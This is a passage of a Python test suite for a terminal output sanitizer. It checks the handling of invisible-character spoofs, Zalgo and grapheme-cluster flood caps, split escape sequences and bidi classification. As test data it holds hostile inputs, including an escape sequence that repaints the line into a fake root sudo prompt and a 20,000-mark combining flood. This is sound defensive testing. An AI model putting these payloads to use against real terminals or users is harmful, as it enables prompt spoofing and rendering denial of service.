          + list(range(0xFE00, 0xFE10)) + list(range(0xFFA0, 0xFFA2))
          + [0xFEFF, 0xE0100, 0xE01EF, 0x1D173, 0x1F600, 0x4E2D, 0x10FFFF])
_DIVERGE = []
_NOT_ONE_UNIT = []
_MODE_BAD = []
for _cp in _SWEEP:
    _ch = chr(_cp)
    _passed = [m for m in S.DISPLAY_MODES if S.render_output(_ch, m) == _ch]
    if not 0x20 <= _cp <= 0x7E:
        # 'show' is the ONE mode allowed to pass a printable non-ASCII glyph;
        # nothing may pass in box/reveal/detail, and nothing invisible anywhere.
        if any(m != 'show' for m in _passed):
            _MODE_BAD.append((_cp, _passed))
        elif _passed and (not _ch.isprintable() or S.is_default_ignorable(_ch)):
            _MODE_BAD.append((_cp, _passed))
    for _mode in S.DISPLAY_MODES:
        _t = S.tui_cell(_ch, _mode)
        _keeps_tui = (_t == _ch)
        if not _keeps_tui and _t != S.BOX:
            _NOT_ONE_UNIT.append((_cp, _mode, _t))
        if _mode in ('box', 'show'):
            # same policy, two implementations: they must agree exactly
            if _keeps_tui != (_mode in _passed):
                _DIVERGE.append((_cp, _mode))
        elif _keeps_tui and not 0x20 <= _cp <= 0x7E:
            # reveal/detail cannot fit a multi-column badge in a grid cell, so a
            # TUI cell there may keep printable ASCII and nothing else
            _DIVERGE.append((_cp, _mode))
eq(_MODE_BAD[:8], [],
   'only show passes a glyph, and no mode passes an invisible unmarked')
eq(_DIVERGE[:8], [],
   'tui_cell and render_output neutralize the same code points in box/show')
eq(_NOT_ONE_UNIT[:8], [],
   'a neutralized TUI cell is always exactly the one-column box placeholder')

# The concrete spoof the sweep generalizes, named so a failure is legible.
for _inv in (0x3164, 0x115F, 0xFE0F, 0x034F, 0x180B, 0xE0100, 0x17B4, 0xFFA0):
    eq(''.join(S.tui_cell(c, 'show') for c in 'ad' + chr(_inv) + 'min'),
       'ad' + S.BOX + 'min',
       'TUI show marks the invisible in "ad<U+%04X>min" (no fake "admin")' % _inv)

# --- BYPASS: the combining-mark (Zalgo) cap must not be CLI-only --------------
# feed_line_edits bounds a mark run at _COMBINING_RUN_MAX because the text engine
# reshapes one huge grapheme cluster in O(n^2). pyte merges marks into the
# PRECEDING cell's data, so a TUI cell arrives as one long string -- an uncapped
# tui_cell lets the same flood through by the mode switch alone, with the DoS
# intact. sanitize.py's own comment claims the cap covers both models, so this
# also pins the comment to the code.
_ZALGO = 'a' + chr(0x0301) * 20000
_cmp, _cells, _col, _sgr, _w = S.feed_line_edits([], 0, {}, _ZALGO)
ok(len(_cells) <= S._COMBINING_RUN_MAX + 1,
   'the CLI cell model caps a combining-mark flood')
ok(len(S.tui_cell(_ZALGO, 'show')) <= S._COMBINING_RUN_MAX + 1,
   'the TUI cell caps the SAME flood (the cap is not CLI-only)')
for _mode in S.DISPLAY_MODES:
    ok(len(S.tui_cell(_ZALGO, _mode)) <= S._COMBINING_RUN_MAX + 1,
       'the TUI combining cap holds in %s mode' % _mode)
# a conformant cluster (well under the stream-safe limit) is untouched
eq(S.tui_cell('e' + chr(0x0301), 'show'), 'e' + chr(0x0301),
   'an ordinary decomposed grapheme survives the TUI cap intact')

# --- BYPASS: the CLI wrapper must carry a split escape, like the widget --------
# feed_chunk_carry documents itself as the CLI-mode incremental escape handler.
# Rendering each os.read() chunk independently loses the introducer, so the
# sequence's REMAINDER prints as text onto the real outer terminal -- carriage
# return included, which repaints the current line into a fake prompt. No escape
# byte survives, so an ESC-only assertion on the whole payload cannot see it.
_WHOLE = '\x1b]0;\rroot@host:~# sudo -S \x07OK\n'
_CHUNK_BAD = []
for _cut in range(1, len(_WHOLE)):
    _carry, _drop, _parts = '', '', []
    for _chunk in (_WHOLE[:_cut], _WHOLE[_cut:]):
        _text, _carry, _drop = S.feed_chunk_carry(_chunk, _carry, _drop)
        _parts.append(S.render_output(_text, 'box'))
    if ''.join(_parts) != S.render_output(_WHOLE, 'box') or _carry:
        _CHUNK_BAD.append(_cut)
eq(_CHUNK_BAD, [],
   'chunked CLI rendering with the carry equals whole-text rendering at every cut')
ok('root@host' not in ''.join(_parts),
   'a split OSC never spills a fake prompt onto the outer terminal')
# (that the CLI wrapper's own read loop wires the carry up is proved
# BEHAVIOURALLY in test_cli.py, by splitting a sequence across two real pty reads
# -- a source grep for the call could not tell a wired call from a dead one.)

# --- CLASH: the paste review and the display marking must agree on the class ---
# Two guards name the risk of the same character: classify_paste writes the
# warning text ("2 bidirectional controls"), marking_class picks the on-screen
# risk colour. When they disagree the user is told one thing and shown another --
# and the understating one is the warning, which is the one they act on.
# U+061C was bidi to the display and merely "invisible" to the paste review.
_CLASS_MAP = {
    'bidi': 'bidirectional control', 'control': 'control character',
    'invisible': 'invisible character', 'confusable': 'non-ASCII character',
    'nonascii': 'non-ASCII character',
}
_CLASS_BAD = []
for _cp in (list(range(0x00, 0x3000)) + [0xFEFF, 0xFE0F, 0xFFA0, 0xE0100,
                                         0x1F600, 0x4E2D, 0x10FFFF]):
    if _cp in (0x09, 0x0A, 0x0D) or 0x20 <= _cp <= 0x7E:
        continue                          # plain ASCII: neither guard reports it
    _ch = chr(_cp)
    _named = S.classify_paste(_ch)
    _want = _CLASS_MAP[S.marking_class(_cp)]
    if [(_want, 1)] != _named:
        _CLASS_BAD.append((_cp, _named, _want))
eq(_CLASS_BAD[:8], [],
   'classify_paste and marking_class name the same risk class for every char')
# the named regressions, spelled out
eq(S.classify_paste(chr(0x061C)), [('bidirectional control', 1)],
   'the Arabic letter mark is reported as a bidi control, not merely invisible')
eq(S.marking_class(0x2062), 'invisible',
   'an invisible math operator is coloured invisible, not plain non-ASCII')
eq(S.marking_class(0x00AD), 'invisible', 'a soft hyphen is coloured invisible')
eq(S.marking_class(0x3164), 'invisible', 'the Hangul filler is coloured invisible')
eq(S.marking_class(0x0430), 'confusable',
   'a homoglyph keeps its confusable class (the sweep must not flatten it)')

# --- CLASH: overlapping escape handlers must claim the SAME bytes -------------
# feed_line_edits dispatches a CSI to the line-edit handler when line_edits is on
# and to the generic stripper when it is off. If the two matched DIFFERENT spans,
# turning the setting off would leave a tail of the sequence on screen -- the
# append-only promise broken by the very switch that is supposed to harden it.
_SPAN_BAD = []
for _op in 'CDGK':
    for _param in ('', '0', '1', '2', '9', '99', '9' * 8, '9' * 5000):
        _seq = '\x1b[' + _param + _op
        _generic = S.ANSI_RE.match(_seq)
        _lineop = S._LINE_CSI_RE.match(_seq)
        if _generic is None or _lineop is None or _generic.end() != _lineop.end():
            _SPAN_BAD.append(_seq[:16])
for _param in ('', '0', '1;31', '38;5;196', '38;2;1;2;3'):
    _seq = '\x1b[' + _param + 'm'
    _generic = S.ANSI_RE.match(_seq)
    _sgr = S._SGR_ONLY_RE.match(_seq)
    if _generic is None or _sgr is None or _generic.end() != _sgr.end():
        _SPAN_BAD.append(_seq)
eq(_SPAN_BAD, [],
   'the line-edit / SGR handlers and the generic stripper consume identical spans')

# --- CLASH: the line_edits setting changed at RUNTIME, mid-stream -------------
# The cell buffer PERSISTS across the flip, so the two settings meet on one line.
# Turning the setting off must make the already-honoured ops inert without
# corrupting the state they built, and without leaking the bytes it now ignores.
_comp, _cells, _col, _sgr, _w = S.feed_line_edits([], 0, {}, 'hello\x1b[3G', 0, True)
eq((''.join(c for c, _k in _cells), _col), ('hello', 2),
   'line_edits on: CSI G moves the cursor')
# flip OFF mid-line: the same op must now do nothing, and print nothing
_c2, _cells2, _col2, _sgr2, _w2 = S.feed_line_edits(
    _cells, _col, _sgr, '\x1b[1G\x1b[K\x1b[5C', 0, False)
eq((''.join(c for c, _k in _cells2), _col2), ('hello', 2),
   'line_edits off mid-stream: CSI G/K/C neither move, erase nor pad')
eq(_cells_render('\x1b[1G\x1b[K\x1b[5C', 'detail', line_edits=False), '',
   'line_edits off displays nothing for the ops it stopped honouring')
# ...and flipping back ON restores them against the SAME buffer
_c3, _cells3, _col3, _sgr3, _w3 = S.feed_line_edits(
    _cells2, _col2, _sgr2, '\x1b[1GH', 0, True)
eq(''.join(c for c, _k in _cells3), 'Hello',
   'line_edits back on: the ops act again on the buffer built while off')
# the cursor must stay inside the buffer across every flip (an out-of-range col
# would index past the cells on the next write)
ok(0 <= _col3 <= len(_cells3), 'the cursor stays within the cell buffer across flips')

# A CSI split across the read that carries the flip: the head arrives under one
# setting and the tail under the other. Neither half may reach the screen.
for _cut in range(1, 5):
    _seq = '\x1b[2K'
    _carry, _drop = '', ''
    _cells, _col, _sgr = [('x', ())], 1, {}
    _text, _carry, _drop = S.feed_chunk_carry(_seq[:_cut], _carry, _drop)
    _c, _cells, _col, _sgr, _w = S.feed_line_edits(
        _cells, _col, _sgr, _text, 0, True)
    _text, _carry, _drop = S.feed_chunk_carry(_seq[_cut:], _carry, _drop)
    _c, _cells, _col, _sgr, _w = S.feed_line_edits(
        _cells, _col, _sgr, _text, 0, False)
    ok(all(c not in '\x1b[2K' or c == 'x' for c, _k in _cells),
       'a CSI split across a line_edits flip leaks no byte (cut %d)' % _cut)
    eq(_carry, '', 'the carry is drained after the split CSI completes (cut %d)' % _cut)

# --- BYPASS: the grapheme-cluster flood cap -----------------------------------
# The cap exists because the text engine reshapes ONE cluster in O(n^2), so a base
# plus thousands of extenders freezes the render. Keying it on the general
# category missed 158 code points that extend a cluster anyway -- U+200C/U+200D,
# the halfwidth katakana sound marks, Thai SARA AM, the emoji modifiers -- each
# good for a 5001-code-point cluster.
#
# The oracle is UAX #29 via regex \X, applied to the RENDERED output: it answers
# "how long is the longest cluster a user's text engine must reshape", which is
# the actual invariant, rather than re-asking the product's own predicate.
import regex as _regex_cl                                # noqa: E402

_CAP = S._COMBINING_RUN_MAX


def _longest_cluster(text):
    return max((len(c) for c in _regex_cl.findall(r'\X', text)), default=0)


def _render_cells(raw, mode='show'):
    _comp, _cells, _col, _sgr, _wraps = S.feed_line_edits([], 0, {}, raw)
    _runs, _ = S.cells_to_runs(_comp, _cells, mode, True, wraps=_wraps)
    return ''.join(t for t, _k in _runs)


# One representative per failure mode: a classic combining mark (category M, the
# only case the old predicate caught), a spacing mark, an enclosing mark, and four
# extenders that are NOT category M.
_CLUSTER_CPS = (0x0301, 0x0903, 0x20E3, 0x1F3FB, 0xFF9E, 0x0E33, 0x200D)
_CLUSTER_BAD = []
for _cp in _CLUSTER_CPS:
    _out = _render_cells('a' + chr(_cp) * 5000)
    if _longest_cluster(_out) > _CAP + 1:
        _CLUSTER_BAD.append(('U+%04X' % _cp, _longest_cluster(_out)))
eq(_CLUSTER_BAD, [],
   'no extender builds a cluster past the cap in the rendered cell model')

# The cap must not fire on conformant text: UAX #15 stream-safe format allows up
# to 30 marks per base, so a 20-mark cluster must survive intact. A cap that ate
# real decomposed text would pass the assertion above while being wrong.
_ok_run = 'a' + chr(0x0301) * 20
eq(_render_cells(_ok_run).count(chr(0x0301)), 20,
   'a conformant 20-mark cluster is not truncated by the cap')

# The predicate must agree with \X over the WHOLE range, not just the samples --
# this is what would have caught the original hole on the day it was written.
_MISSED = [cp for cp in range(0x300, 0x110000)
           if (len(_regex_cl.findall(r'\X', 'a' + chr(cp))) == 1)
           != bool(S._is_mark(chr(cp)))]
eq(_MISSED[:8], [],
   'the cluster-extension predicate agrees with UAX #29 at every code point')
# ...and the callers' ord(ch) < 0x0300 fast-reject is only sound if nothing below
# that extends a cluster. Asserted, not assumed.
_LOW = [cp for cp in range(0x20, 0x300)
        if len(_regex_cl.findall(r'\X', 'a' + chr(cp))) == 1]
eq(_LOW, [], 'no code point below U+0300 extends a cluster (fast-reject is sound)')

# --- result -------------------------------------------------------------------
sys.stdout.write('secure-terminal-tests: %d passed, %d failed\n' % (PASS, FAIL))
sys.exit(0 if FAIL == 0 else 1)
